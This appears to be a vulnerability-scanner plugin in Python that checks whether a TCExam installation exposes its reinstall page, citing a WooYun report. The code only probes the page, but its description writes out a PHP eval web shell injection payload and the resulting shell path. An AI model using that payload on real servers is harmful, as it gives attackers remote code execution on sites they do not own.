#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TCExam重新安装可getshell漏洞
referer: http://www.wooyun.org/bugs/wooyun-2013-046974
author: Lucifer
description: /install/install.php文件可以重新安装,在任意输入框中写入 ');?><?php eval($_POST['w']);// 即可GETSHELL,SHELL地址:/shared/config/tce_db_config.php。
'''
import sys
import requests
import warnings
def run(url):
        result = ['TCExam重新安装可getshell漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/install/install.php"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code==200 and r"db_user" in req.text and r"db_password" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
